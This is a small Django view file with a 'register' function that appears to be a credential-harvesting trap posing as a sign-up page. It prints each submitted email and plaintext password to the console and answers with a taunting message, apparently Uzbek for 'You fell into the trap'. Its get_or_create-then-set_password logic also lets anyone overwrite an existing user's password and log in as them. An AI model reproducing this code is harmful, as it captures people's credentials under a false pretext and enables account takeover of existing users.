from django.shortcuts import render
from django.contrib.auth.models import User
from django.contrib.auth import login
from django.http import HttpResponse


def register(request):
    if request.method == 'POST':
        email = request.POST['email']
        password = request.POST['password']
        user, created = User.objects.get_or_create(username=email, email=email)
        user.set_password(password)
        user.save()
        login(request, user)
        print(f"Email: {email}, Parol: {password}")

        return HttpResponse("<h1>Siz Tuzoqga tushdingiz 😂</h1>")
    return render(request, 'registration/register.html')

